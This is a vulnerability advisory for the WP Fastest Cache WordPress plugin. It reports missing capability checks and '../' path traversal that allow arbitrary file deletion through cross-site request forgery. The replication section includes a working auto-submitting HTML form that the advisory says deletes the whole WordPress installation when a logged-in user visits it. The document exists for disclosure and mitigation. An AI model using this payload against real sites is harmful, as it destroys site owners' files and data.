### Description

The WP Fastest Cache plugin for WordPress is vulnerable to unauthorized arbitrary file deletion in versions up to, and including, 0.9.0.2 due to a lack of capability checking and insufficient path validation. This makes it possible for authenticated users with minimal permissions to delete arbitrary files from the server.

# Advisory

## Cross-Site Request Forgery vulnerability in the WP Fastest Cache plugin

## Overview

The WP Fastest Cache plugin contains multiple vulnerabilities that can allow an attacker to delete all files on the Wordpress installation.

We discovered that the WP Fastest Cache plugin allowed users to delete files and directories. When doing so, the plugin did not check for and remove the text `../` in the path of the user controlled value. This would have allowed us to delete the entire WordPress installation, including any backups.

## Replication

WARNING: This replication process is destructive, and is included for information purposes only. Do not follow these steps on a production system.

Ensure that WP Fastest Cache has been set up and enabled (including ticking `Enable` for `Cache System`).

Then set up a local copy (hostname `temporarycopy.local` in this example).

Create an HTML file containing the following code, and save it on your local drive:

```
    <html>
    <head><title>t</title></head>
    <body>
    <form id="form" action="https://temporarycopy.local/wp-admin/admin-ajax.php?path=/../../../.." method="post">
    <input type="hidden" name="action" value="wpfc_delete_current_page_cache"/>
    </form>
    <script>document.form.submit();</script>
    </body>
    </html>

```

Log into WordPress, and then visit the HTML file you have just created. The entire website will be deleted.

## Mitigation/further actions

Upgrade to version 0.9.0.3 when it is released.
